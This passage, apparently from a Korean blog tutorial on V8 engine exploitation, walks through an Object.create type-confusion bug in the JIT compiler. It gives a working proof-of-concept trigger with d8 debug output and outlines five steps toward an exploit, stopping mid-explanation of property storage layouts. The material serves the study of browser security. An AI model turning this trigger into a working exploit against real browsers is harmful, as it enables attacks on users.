class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt; - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt; - construction counter: <span class="hljs-number">0</span>{x: <span class="hljs-number">13</span>}</code></pre><p>&#xC704;&#xC640; &#xAC19;&#xC774; &#xAC1D;&#xCCB4;&#xAC00; &#xD558;&#xB098; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; <code>Object.Create</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c">d8&gt; Object.create(obj){}d8&gt; %DebugPrint(obj)DebugPrint: <span class="hljs-number">0x21700389515</span>: [JS_OBJECT_TYPE] - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x02170006d05d</span> &lt;Map[<span class="hljs-number">16</span>](HOLEY_ELEMENTS)&gt; [DictionaryProperties] - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - elements: <span class="hljs-number">0x0217000007bd</span> &lt;FixedArray[<span class="hljs-number">0</span>]&gt; [HOLEY_ELEMENTS] - properties: <span class="hljs-number">0x02170038b3dd</span> &lt;NameDictionary[<span class="hljs-number">18</span>]&gt; - All own properties (excluding elements): {   x: <span class="hljs-number">13</span> (data, dict_index: <span class="hljs-number">1</span>, attrs: [WEC]) }<span class="hljs-number">0x2170006d05d</span>: [Map] in OldSpace - <span class="hljs-built_in">map</span>: <span class="hljs-number">0x021700053419</span> &lt;MetaMap (<span class="hljs-number">0x021700053469</span> &lt;NativeContext[<span class="hljs-number">300</span>]&gt;)&gt; - type: JS_OBJECT_TYPE - instance size: <span class="hljs-number">16</span> - inobject properties: <span class="hljs-number">1</span> - unused property fields: <span class="hljs-number">0</span> - elements kind: HOLEY_ELEMENTS - <span class="hljs-keyword">enum</span> length: invalid - dictionary_map - may_have_interesting_properties - prototype_map - prototype info: <span class="hljs-number">0x02170006d085</span> &lt;PrototypeInfo&gt; - prototype_validity_cell: <span class="hljs-number">0x021700000ac9</span> &lt;Cell value= [cleared]&gt; - instance descriptors (own) #<span class="hljs-number">0</span>: <span class="hljs-number">0x0217000007e5</span> &lt;DescriptorArray[<span class="hljs-number">0</span>]&gt; - prototype: <span class="hljs-number">0x0217000545fd</span> &lt;Object <span class="hljs-built_in">map</span> = <span class="hljs-number">0000021700053979</span>&gt; - constructor: <span class="hljs-number">0x021700053e91</span> &lt;JSFunction Object (sfi = <span class="hljs-number">0000021700351</span>A15)&gt; - dependent code: <span class="hljs-number">0x0217000007cd</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt; - construction counter: <span class="hljs-number">0</span>{x: <span class="hljs-number">13</span>}</code></pre><p>&#xD568;&#xC218; &#xD638;&#xCD9C; &#xD6C4; map&#xC774; <code>FastProperties</code> &#xC5D0;&#xC11C; <code>DictionaryProperties</code> &#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; NoWrite &#xB77C;&#xB294; &#xD50C;&#xB798;&#xADF8;&#xC758; &#xAC00;&#xC815;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xB294;&#xB370;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAE30; &#xC804;&#xACFC; &#xD6C4;&#xB85C; map&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xB294; operation&#xC774; &#xC5C6;&#xB2E4;&#xBA74; Type Confusion&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-Proof-of-Concept"><a href="#2-2-Proof-of-Concept" class="headerlink" title="2.2 Proof of Concept"></a>2.2 Proof of Concept</h2><h3 id="Type-Confusion-PoC"><a href="#Type-Confusion-PoC" class="headerlink" title="Type Confusion PoC"></a>Type Confusion PoC</h3><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{    <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>    obj.a;    <span class="hljs-comment">// Force a Map Transition via our side-effect</span>    Object.create(obj)    <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>    <span class="hljs-keyword">return</span> obj.b;}vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Warm-up code</span>vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>});%OptimizeFunctionOnNextCall(vuln); <span class="hljs-comment">// JIT Compile vuln</span>vuln({a:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>}); <span class="hljs-comment">// Trigger type-confusion - should not return 43!</span></code></pre><p><code>Object.Create</code> &#xB97C; &#xC774;&#xC6A9;&#xD55C; Type Confusion Trigger &#xB97C; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. d8&#xC5D0;&#xC11C; <code>--allow-naitives-syntax</code> &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC8FC;&#xACE0; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC785;&#xB825;&#xD558;&#xBA74;, </p><pre><code class="hljs css"><span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})43<span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})43<span class="hljs-selector-tag">d8</span>&gt; %<span class="hljs-selector-tag">OptimizeFunctionOnNextCall</span>(<span class="hljs-selector-tag">vuln</span>)<span class="hljs-selector-tag">undefined</span><span class="hljs-selector-tag">d8</span>&gt; <span class="hljs-selector-tag">vuln</span>({<span class="hljs-attribute">a</span>:<span class="hljs-number">42</span>, b:<span class="hljs-number">43</span>})0</code></pre><p>&#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;(&#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;)&#xC5D0;&#xC11C;&#xB294; return &#xAC12;&#xC774; &#xB2E4;&#xB984;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB97C; IR &#xADF8;&#xB798;&#xD504;&#xB85C; &#xBCF4;&#xBA74;,</p><pre><code class="hljs c">C:\dev\v8\v8\out\x64.debug&gt;d8 --allow-natives-syntax --trace-turbo poc.jsConcurrent recompilation has been disabled <span class="hljs-keyword">for</span> tracing.---------------------------------------------------Begin compiling method vuln <span class="hljs-keyword">using</span> Turbofan---------------------------------------------------Finished compiling method vuln <span class="hljs-keyword">using</span> Turbofan</code></pre><p><img src="image%204.png" alt="image.png"></p><p>Redundancy Elination&#xC73C;&#xB85C; &#xC778;&#xD574;&#xC11C; &#xC67C;&#xCABD;&#xC5D0; &#xC788;&#xB294; 46&#xBC88; <code>CheckMaps</code> &#xAC00; &#xC81C;&#xAC70;&#xB428;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; 28&#xBC88; <code>JSCreateObject</code> &#xB97C; &#xC9C0;&#xB0A0; &#xB54C; Map transition&#xC774; &#xBC1C;&#xC0DD;&#xD574; Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB294;&#xAC81;&#xB2C8;&#xB2E4;.</p><h3 id="Five-Steps-to-generate-a-Proof-of-Concept"><a href="#Five-Steps-to-generate-a-Proof-of-Concept" class="headerlink" title="Five Steps to generate a Proof of Concept"></a>Five Steps to generate a Proof of Concept</h3><p>&#xC704;&#xC640; &#xAC19;&#xC774; Type Confusion &#xC744; &#xC77C;&#xC73C;&#xD0A8; &#xD6C4;, &#xAC1D;&#xCCB4;&#xB97C; &#xC811;&#xADFC;&#xD560; &#xB54C;&#xC758; side effect&#xB85C; exploit&#xC744; &#xD558;&#xB294;&#xAC74;&#xB370;&#xC694;. &#xC811;&#xADFC;&#xD558;&#xB294; &#xB2E8;&#xACC4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; 5&#xAC1C;&#xC758; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785; &#xAC1D;&#xCCB4; &#xC0DD;&#xC131;: &#xC0C8;&#xB85C;&#xC6B4; &#xAC1D;&#xCCB4;&#xB97C; inline-property&#xB85C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774; &#xAC1D;&#xCCB4;&#xB294; <code>Object.create</code>&#xC758; &#xD504;&#xB85C;&#xD1A0;&#xD0C0;&#xC785;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</li><li>out-of-line property &#xCD94;&#xAC00;: &#xAC1D;&#xCCB4;&#xC758; property backing store&#xC5D0; out-of-line property&#xB97C; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; property&#xB294; Map transition &#xC774;&#xD6C4; &#xC811;&#xADFC;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li><li><code>CheckMap</code> &#xC5F0;&#xC0B0; &#xAC15;&#xC81C; &#xC2E4;&#xD589;: <code>CheckMap</code> &#xC5F0;&#xC0B0;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC911;&#xBCF5; &#xC81C;&#xAC70;(redundancy elimination)&#xB97C; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xC774;&#xD6C4;&#xC5D0; &#xB098;&#xD0C0;&#xB098;&#xB294; &#xBAA8;&#xB4E0; <code>CheckMap</code> &#xC5F0;&#xC0B0;&#xC774; &#xC81C;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;. </li><li>Map transition &#xC720;&#xB3C4;: &#xC774;&#xC804;&#xC5D0; &#xB9CC;&#xB4E0; &#xAC1D;&#xCCB4;&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>Object.create</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xAD6C;&#xC870;&#xAC00; &#xBC14;&#xB00C;&#xACE0;, &#xC0C8;&#xB85C;&#xC6B4; &#xD788;&#xB4E0; &#xD074;&#xB798;&#xC2A4;(Map)&#xB85C; &#xC804;&#xD658;(transition)&#xB429;&#xB2C8;&#xB2E4;.</li><li>out-of-line property &#xC811;&#xADFC;: &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C;, out-of-line property&#xC5D0; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><blockquote><p><strong>&#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; (In-object Properties)</strong><br>&#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB294; &#xAC1D;&#xCCB4; &#xC790;&#xCCB4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC5D0; &#xC9C1;&#xC811; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xC18D;&#xC131;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC18D;&#xC131;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xB54C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBA54;&#xBAA8;&#xB9AC; &#xCC38;&#xC870;&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xC5B4; &#xAC00;&#xC7A5; &#xBE60;&#xB974;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xBC29;&#xC2DD;&#xC785;&#xB2C8;&#xB2E4;. V8&#xC740; &#xAC1D;&#xCCB4;&#xC758; Map(Hidden Class)&#xC744; &#xD1B5;&#xD574; &#xAC01; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xC758; &#xC815;&#xD655;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xD30C;&#xC545;&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>&#xC544;&#xC6C3;&#xC624;&#xBE0C;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; (Out-of-line Properties)</strong><br>&#xAC1D;&#xCCB4;&#xC5D0; &#xC18D;&#xC131;&#xC774; &#xB9CE;&#xC544; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xACF5;&#xAC04;&#xC774; &#xBD80;&#xC871;&#xD574;&#xC9C0;&#xBA74;, &#xB098;&#xBA38;&#xC9C0; &#xC18D;&#xC131;&#xB4E4;&#xC740; &#xC544;&#xC6C3;&#xC624;&#xBE0C;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB85C; &#xBD84;&#xB958;&#xB418;&#xC5B4; &#xBCC4;&#xB3C4;&#xC758; &#xC800;&#xC7A5;&#xC18C;&#xC778; property backing store&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xBC29;&#xC2DD;&#xC740; &#xC778;&#xB77C;&#xC778; &#xBC29;&#xC2DD;&#xBCF4;&#xB2E4; <strong>&#xD55C; &#xB2E8;&#xACC4;&#xC758; &#xAC04;&#xC811; &#xC811;&#xADFC;&#xC774; &#xB354; &#xD544;&#xC694;</strong>&#xD569;&#xB2C8;&#xB2E4;.</p><p><strong>Speculation Guard</strong><br><code>CheckMap</code>&#xC740; &#xAC1D;&#xCCB4;&#xC758; &#xD788;&#xB4E0; &#xD074;&#xB798;&#xC2A4;&#xAC00; &#xC608;&#xC0C1;&#xD55C; &#xAC83;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xC5F0;&#xC0B0;&#xC73C;&#xB85C;, Speculation Guard&#xC758; &#xC77C;&#xC885;&#xC785;&#xB2C8;&#xB2E4;. JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xD328;&#xD134;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC5EC; &#xD2B9;&#xC815; &#xBCC0;&#xC218;&#xC758; &#xD0C0;&#xC785;&#xC774; &#xD56D;&#xC0C1; &#xAC19;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD558;&#xACE0;, &#xC774; &#xAC00;&#xC815;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. <code>CheckMap</code>&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xCD94;&#xCE21;&#xC774; &#xC5EC;&#xC804;&#xD788; &#xC720;&#xD6A8;&#xD55C;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></blockquote><p>&#xB9D0;&#xB85C;&#xB9CC; &#xBCF4;&#xBA74; &#xC798; &#xC774;&#xD574;&#xAC00; &#xC548;&#xB418;&#xB2C8; &#xB2E4;&#xC74C; &#xC808;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-3-Exploiting-a-Type-Confusion"><a href="#2-3-Exploiting-a-Type-Confusion" class="headerlink" title="2.3 Exploiting a Type Confusion"></a>2.3 <strong>Exploiting a Type Confusion</strong></h2><h3 id="Map-Transition"><a href="#Map-Transition" class="headerlink" title="Map Transition"></a>Map Transition</h3><p>2.2&#xC808;&#xC5D0;&#xC11C;&#xB294; <code>%OptimizeFunctionOnNextCall</code>&#xB97C; &#xC37C;&#xB294;&#xB370;, &#xC774;&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654; &#xC2DC;&#xC810;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC774;&#xC5B4;&#xC11C;, &#xBC18;&#xBCF5;&#xBB38;&#xC744; &#xD1B5;&#xD574; V8&#xC774; &#xC2A4;&#xC2A4;&#xB85C; &#xCD5C;&#xC801;&#xD654; &#xD544;&#xC694;&#xC131;&#xC744; &#xD310;&#xB2E8;&#xD558;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD558;&#xB3C4;&#xB85D; &#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB3D9;&#xC548; &#xAC19;&#xC774; &#xC54C;&#xC544;&#xBD24;&#xB358; &#xAC83;&#xCC98;&#xB7FC; &#xC77C;&#xBC18;&#xC801;&#xC778; JavaScript &#xCF54;&#xB4DC;&#xB294; V8 &#xC5D4;&#xC9C4;&#xC758; &#xCD5C;&#xC801;&#xD654; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC744; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. V8&#xC740; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD2B9;&#xC815; &#xD568;&#xC218;&#xAC00; &#x201C;&#xC790;&#xC8FC; &#xC2E4;&#xD589;&#xB418;&#xB294;(hot)&#x201D; &#xACBD;&#xB85C;&#xB77C;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xBA74;, JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;(Maglev, TurboFan)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xACE0;&#xC131;&#xB2A5;&#xC758; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB85C; &#xCD5C;&#xC801;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">vuln</span><span class="hljs-params">(obj)</span> </span>{  <span class="hljs-comment">// Access Property a of obj, forcing a CheckMap operation</span>  obj.a;  <span class="hljs-comment">// Force a Map Transition via our side-effect</span>  Object.create(obj)  <span class="hljs-comment">// Trigger our type-confusion by accessing an out-of-bound property</span>  <span class="hljs-keyword">return</span> obj.b;}<span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {  let obj = {a:<span class="hljs-number">42</span>}; <span class="hljs-comment">// Create object with in-line properties</span>  obj.b = <span class="hljs-number">43</span>; <span class="hljs-comment">// Store property out-of-line in backing store</span>  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">1</span>) { %DebugPrint(obj); }  vuln(obj); <span class="hljs-comment">// Trigger type-confusion</span>  <span class="hljs-keyword">if</span> (i = <span class="hljs-number">9999</span>) { %DebugPrint(obj); }}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xB97C; json &#xD30C;&#xC77C;&#xB85C; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; d8&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%205.png" alt="image.png"></p><ul><li>&#xAC1D;&#xCCB4;&#xC758; layout&#xC744; &#xB2F4;&#xACE0; &#xC788;&#xB294; Map&#xC774; <code>FastProperties</code>&#xC5D0;&#xC11C; <code>DictionaryProperties</code>&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>(&#xC0AC;&#xC9C4; &#xC544;&#xB798;&#xBD80;&#xBD84;&#xC774; &#xC880; &#xC798;&#xB9AC;&#xAE34; &#xD588;&#xC9C0;&#xB9CC;..) property backing store&#xAC00; <code>FixedArray</code>&#xC5D0;&#xC11C; <code>NameDictionary</code>&#xB85C; &#xC804;&#xD658;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><blockquote><p>V8 &#xC5D4;&#xC9C4;&#xC740; &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131;(property)&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC544; &#xC778;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xACF5;&#xAC04;&#xC744; &#xCD08;&#xACFC;&#xD560; &#xB54C;, &#xB098;&#xBA38;&#xC9C0; &#xC18D;&#xC131;&#xB4E4;&#xC744; &#xBCC4;&#xB3C4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC800;&#xC7A5;&#xC18C;&#xB97C; property backing store&#xB77C;&#xACE0; &#xBD80;&#xB974;&#xB294;&#xB370;, &#xC774;&#xAC83;&#xC774; &#xBC14;&#xB85C; <strong>FixedArray</strong>&#xB85C; &#xAD6C;&#xD604;&#xB41C; <strong>PropertyArray</strong>&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <strong>PropertyArray</strong>&#xB294; &#xAC1D;&#xCCB4;&#xC758; &#xC544;&#xC6C3;&#xC624;&#xBE0C;&#xB77C;&#xC778; &#xD504;&#xB85C;&#xD37C;&#xD2F0;&#xB97C; &#xB2F4;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xBAA9;&#xC801;&#xC758; <strong>FixedArray</strong>&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></blockquote><p><code>FixedArray</code>&#xC640; <code>NameDictionary</code> &#xB294; &#xAC01;&#xAC01; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xC131;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><p>FixedArray (PropertyArray)&#xB294; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xAC12; &#xC2AC;&#xB86F;&#xC744; &#xAC16;&#xB294; &#xB2E8;&#xC21C; &#xBC30;&#xC5F4; &#xAD6C;&#xC870;. &#xC8FC;&#xB85C; &#xAC1D;&#xCCB4;&#xC758; out-of-line(&#xC778;&#xB77C;&#xC778; &#xACF5;&#xAC04;&#xC744; &#xCD08;&#xACFC;&#xD55C;) &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xAC12;&#xB4E4;&#xC744; <strong>&#xC21C;&#xC11C;&#xB300;&#xB85C;</strong> &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC744; &#xB2E8;&#xC21C;&#xD558;&#xAC8C; &#xB098;&#xD0C0;&#xB0B4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gherkin">FixedArray:[ header |<span class="hljs-string"> slot0 </span>|<span class="hljs-string"> slot1 </span>|<span class="hljs-string"> slot2 </span>|<span class="hljs-string"> slot3 </span>|<span class="hljs-string"> ... ]</span></code></pre><p>NameDictionary&#xB294; &#xD574;&#xC2DC;&#xD14C;&#xC774;&#xBE14;/&#xB515;&#xC154;&#xB108;&#xB9AC; &#xD615;&#xD0DC;&#xB85C; (key, value, details) &#xD29C;&#xD50C;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC18D;&#xC131; &#xC774;&#xB984;&#xACFC; &#xAC12;, &#xADF8;&#xB9AC;&#xACE0; &#xC18D;&#xC131;&#xC758; &#xC18D;&#xC131;&#xAC12;(details)&#xC744; &#xD568;&#xAED8; &#xC720;&#xC9C0;&#xD574;&#xC57C; &#xD558;&#xBBC0;&#xB85C; &#xAD6C;&#xC870;&#xAC00; &#xBCF5;&#xC7A1;&#xD569;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xC138;&#xC2A4;-&#xB2E8;&#xC704; &#xD574;&#xC2DC; &#xC2DC;&#xB4DC;(randomness)&#xAC00; &#xC11E;&#xC774;&#xBBC0;&#xB85C;, &#xD0A4;&#xB4E4;&#xC774; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xBC30;&#xCE58;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB294; &#xC2E4;&#xD589;&#xB9C8;&#xB2E4; &#xBC14;&#xB014; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xB9D0;&#xD574;&#xC11C;<br>NameDictionary&#xB294; &#xBCF5;&#xC7A1;&#xD55C; &#xAD6C;&#xC870;&#xB97C; &#xAC00;&#xC9C4; &#xD574;&#xC2DC; &#xD14C;&#xC774;&#xBE14;&#xC774;&#xBA70;, &#xC18D;&#xC131;&#xC758; &#xC800;&#xC7A5; &#xC704;&#xCE58;&#xAC00; &#xC2E4;&#xD589;&#xB9C8;&#xB2E4; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xBCC0;&#xB3D9;&#xB418;&#xC5B4; &#xC608;&#xCE21;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB610;&#xD55C; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xB098;&#xD0C0;&#xB0B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs gherkin">NameDictionary:[ header |<span class="hljs-string"> ... </span>|<span class="hljs-string"> key0 </span>|<span class="hljs-string"> value0 </span>|<span class="hljs-string"> details0 </span>|<span class="hljs-string"> key1 </span>|<span class="hljs-string"> value1 </span>|<span class="hljs-string"> details1 </span>|<span class="hljs-string">...]</span></code></pre><p>&#xC774;&#xCC98;&#xB7FC; &#xC11C;&#xB85C; &#xB2E4;&#xB978; type&#xC758; property&#xAC00; confusion &#xB418;&#xBA74; &#xC5B4;&#xB5A4; side-effect&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?</p><p><code>FixedArray</code>&#xC5D0; &#xC800;&#xC7A5;&#xB420; &#xB54C; &#xC21C;&#xC11C;&#xB300;&#xB85C;(<code>0</code>, <code>1</code>, <code>2</code>&#x2026;) &#xC704;&#xCE58;&#xD588;&#xB358; &#xC18D;&#xC131;&#xB4E4;&#xC774; <code>NameDictionary</code>&#xB85C; &#xC804;&#xD658;&#xB418;&#xBA74;, &#xC644;&#xC804;&#xD788; &#xB2E4;&#xB978; &#xBA54;&#xBAA8;&#xB9AC; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xBD88;&#xADDC;&#xCE59;&#xD558;&#xAC8C; &#xD769;&#xC5B4;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xB294; <code>FixedArray</code>&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; <code>NameDictionary</code>&#xC758; &#xAD6C;&#xC870;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74;&#xC11C; <strong>&#xB2E4;&#xB978; &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294; &#xC18D;&#xC131;&#xC774; &#xC6B0;&#xC5F0;&#xD788; &#xAC19;&#xC740; &#xC624;&#xD504;&#xC14B;&#xC5D0; &#xACB9;&#xCCD0; 